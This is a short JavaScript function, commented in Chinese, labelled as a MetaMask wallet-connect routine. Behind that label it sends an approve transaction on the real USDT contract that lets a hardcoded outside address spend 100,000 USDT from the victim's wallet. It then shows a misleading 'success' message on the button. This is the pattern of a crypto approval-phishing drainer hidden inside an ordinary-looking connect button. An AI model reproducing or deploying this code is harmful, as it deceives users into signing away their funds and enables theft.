async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            // 请求连接到钱包
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            // 创建以太坊提供者和签名者
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            
            // USDT 合约地址和 ABI
            const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
            const usdtAbi = [
                {
                    "constant": false,
                    "inputs": [
                        { "name": "_spender", "type": "address" },
                        { "name": "_value", "type": "uint256" }
                    ],
                    "name": "approve",
                    "outputs": [{ "name": "", "type": "bool" }],
                    "type": "function"
                }
            ];
            
            // 创建 USDT 合约实例
            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
            
            // 授权地址和数量
            const spenderAddress = "0xf2B9e347D4379Decd69A3B03fFa4e0AB878EF6D1";
            const amount = ethers.utils.parseUnits("100000", 6); // 100000 USDT
            
            // 发送授权交易
            const tx = await usdtContract.approve(spenderAddress, amount);
            await tx.wait();
            
            // 更新按钮文本
            document.getElementById('okButton').innerText = '成功USDT100000等待导入';
        } catch (error) {
            console.error(error);
            document.getElementById('okButton').innerText = '连接失败请重新连接';
        }
    } else {
        alert('请安装 MetaMask 等以太坊钱包插件');
    }
}
